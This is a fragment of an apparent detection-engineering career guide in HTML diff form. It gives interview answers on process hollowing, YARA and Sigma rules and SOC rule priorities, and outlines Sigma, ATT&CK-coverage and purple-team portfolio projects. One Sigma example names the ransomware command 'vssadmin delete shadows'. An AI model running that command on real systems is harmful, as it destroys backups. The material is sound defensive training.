+<strong style="color:#00d4ff;">Answer: "Process hollowing occurs when a malicious process creates a legitimate process in a suspended state, unmaps the legitimate code, injects malicious code into the process space, and resumes the thread. Detection log events: (1) Sysmon Event ID 8 (CreateRemoteThread) — a process creating a thread in another process indicates injection, (2) Sysmon Event ID 1 — process creation with CREATE_SUSPENDED flag (not directly visible, but unusual parent-child relationships), (3) Sysmon Event ID 7 (ImageLoad) — DLL loaded from unusual path into a system process, (4) Sysmon Event ID 10 (ProcessAccess) — handle opened to a process with PROCESS_CREATE_THREAD and PROCESS_VM_WRITE access, (5) Windows ETW events from Microsoft-Windows-Kernel-Process. Key behavioral pattern: a process (often explorer.exe or svchost.exe) that was created and then suddenly starts making network connections or accessing files in abnormal ways. Also look for: a legitimate process (notepad.exe, svchost.exe) running from abnormal location (C:\Users\Public instead of C:\Windows\System32)."</strong><br><br>
+
+<b>2. "What's the difference between a YARA rule and a Sigma rule? When would you use each?"</b><br>
+<strong style="color:#00d4ff;">Answer: "YARA rules are for identifying malware through file and memory content patterns — byte sequences, strings, file metadata. They're used for: malware classification, memory forensics, file triage. Example: a YARA rule detecting the unique XOR key pattern used by LockBit ransomware. Sigma rules are for identifying adversary behavior through log events — process creation, network connections, registry changes. They're used for: SIEM alerting, detection engineering, threat hunting. Example: a Sigma rule detecting vssadmin.exe with 'delete shadows' parameter. You use YARA when you have a file or memory sample and want to identify it. You use Sigma when you have logs and want to detect behavior. They're complementary — YARA identifies the 'what' (the malware family), Sigma identifies the 'how' (the attacker behavior pattern)."</strong><br><br>
+
+<b>3. "How do you prioritize which detection rules to create first when building a new SOC?"</b><br>
+<strong style="color:#00d4ff;">Answer: "I prioritize by risk: (1) First, techniques that cause immediate business impact if exploited — ransomware (T1486), data exfiltration (T1048), credential theft (T1003) — these have the highest cost if missed. (2) Second, techniques with the shortest attacker dwell time — initial access techniques like phishing (T1566) and exploitation of public-facing apps (T1190). (3) Third, techniques that high-probability threats use — check threat intel for the most common techniques targeting your industry. (4) Fourth, techniques that are easiest to detect with available data — if you already have Sysmon deployed, prioritize rules that use Sysmon data over rules requiring new log sources. (5) Use MITRE ATT&CK prioritization: focus on techniques in the top ATT&CK navigator layers (Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement). Build a minimum viable detection set covering the 'common 20' techniques first, then expand coverage over time."</strong>
+</div>
+
+<h6 class="text-danger mt-4 mb-2"><i class="bi bi-briefcase me-2"></i>13. PORTFOLIO PROJECTS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Project: Sigma Rule Library for Top 20 ATT&CK Techniques</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Create a personal Sigma rule library covering the top 20 most common MITRE ATT&CK techniques. Each rule must be tested, documented, and ready for deployment.<br><br>
+<b>Architecture:</b> GitHub repo with organized Sigma rules. CI/CD pipeline (GitHub Actions) that converts rules to Splunk/Elastic format and validates syntax.<br><br>
+<b>Tools:</b> Sigma CLI, GitHub, text editor, Sysmon test lab for validation.<br><br>
+<b>Steps:</b> (1) Research the top 20 ATT&CK techniques for your industry, (2) Write Sigma rule for each technique following Sigma specification 1.0, (3) Include proper MITRE tags, logsource categories, detection logic, false positive notes, and severity, (4) Convert each rule to Splunk and Elastic format, (5) Test each rule against Atomic Red Team tests — capture screenshots of alerts, (6) Document FP scenarios and exceptions, (7) Add to GitHub repo with README explaining installation and usage, (8) Create CI GitHub Action that runs <code>sigma check</code> on every commit to validate rule syntax.<br><br>
+<b>Documentation:</b> Rule catalog spreadsheet mapping each rule to: ATT&CK technique, MITRE ID, log source required, SIEM query (converted), test results, FP notes, last updated date. Demonstrates: Sigma proficiency, ATT&CK knowledge, testing methodology, documentation standards, version control.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Project: Detection Coverage Heatmap and Gap Analysis</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Create a detection coverage heatmap for your organization's SIEM showing which ATT&CK techniques are covered, partially covered, or not covered. Perform gap analysis and create implementation plan to address top gaps.<br><br>
+<b>Architecture:</b> Python script that reads SIEM rules API → maps to MITRE ATT&CK → generates coverage.json → pushes to Elastic/Tableau/Grafana visualization.<br><br>
+<b>Tools:</b> Python, MITRE ATT&CK API (attack.mitre.org), SIEM API, Elasticsearch or Grafana for visualization, ATT&CK Navigator for heatmap export.<br><br>
+<b>Steps:</b> (1) Export all detection rules from SIEM via API (Splunk: REST API, Elastic: Detection Rules API), (2) Parse rule metadata and extract MITRE technique IDs, (3) Use MITRE ATT&CK API to get all techniques per tactic, (4) Create coverage matrix: techniques × tactics = coverage status (covered = rule exists, partial = partial rule, none = no rule), (5) Generate heatmap JSON for MITRE ATT&CK Navigator, (6) Build dashboard showing: coverage % by tactic, coverage trend over time, top 10 uncovered techniques by risk, (7) For each uncovered technique, research: likelihood (how common is this technique?), impact (how damaging?), detectability (can we detect it with current data sources?), (8) Prioritize top 10 uncovered techniques and create implementation plan for each: log source needed, Sigma rule to create, testing plan, estimated effort.<br><br>
+<b>Documentation:</b> Coverage heatmap PDF, gap analysis report with prioritized implementation plan, Python scripts for automation. Demonstrates: MITRE ATT&CK expertise, API integration, data analysis, strategic detection planning, automation skills.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Project: Automated Purple Team Platform</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build a fully automated purple team platform that: schedules Atomic Red Team tests, checks SIEM for detection, updates coverage heatmap, creates Jira tickets for detection gaps, and tracks coverage improvement over time.<br><br>
+<b>Architecture:</b> Python orchestrator → Atomic Red Team execution (on Windows VMs) → SIEM API query → Elasticsearch coverage dashboard → Jira API for gap tickets → Grafana for metrics visualization. All wrapped in Docker containers.<br><br>
+<b>Tools:</b> Python, Docker, Atomic Red Team, Splunk/Elastic API, Jira API, Elasticsearch, Grafana, Jenkins/ GitHub Actions for scheduling.<br><br>
+<b>Steps:</b> (1) Design modular Python framework: Scheduler → TestExecutor → ResultsCollector → CoverageUpdater → GapTicketCreator, (2) Implement TestExecutor: SSH/WinRM into Windows VM, run Invoke-AtomicTest for specified techniques, capture output, (3) Implement ResultsCollector: query SIEM API for alerts in the time window around each test, parse alert details (which rule fired, severity, alert ID), (4) Implement CoverageUpdater: compare executed tests vs detected alerts for each technique, update Elasticsearch coverage index, (5) Implement GapTicketCreator: for techniques where no alert fired, create Jira ticket with details: technique ID, name, description, suggested detection approach, log source needed, (6) Build Grafana dashboard showing: purple team run history, coverage % over time, detection rate per technique, rules that need attention, (7) Schedule automated runs: weekly full scan of "critical" techniques, monthly full ATT&CK scan, (8) Implement continuous improvement: track TTDC (Time to Detect Coverage) — how long does it take to write a rule for a gap after it's identified, (9) Add real-time purple team: when engineer deploys a new rule, auto-trigger corresponding ART test, verify detection before marking rule as "production ready."<br><br>
+<b>Documentation:</b> Full platform architecture diagram, API integration guides (SIEM, Jira, Windows remote execution), deployment Docker Compose file, user manual for SOC engineers, example run report showing before/after coverage improvement (e.g., "Week 1: 35% coverage → Week 12: 72% coverage"). Demonstrates: full-stack security engineering, advanced automation, API integration, data-driven security operations, and continuous improvement methodology.
 </div>
 </div>
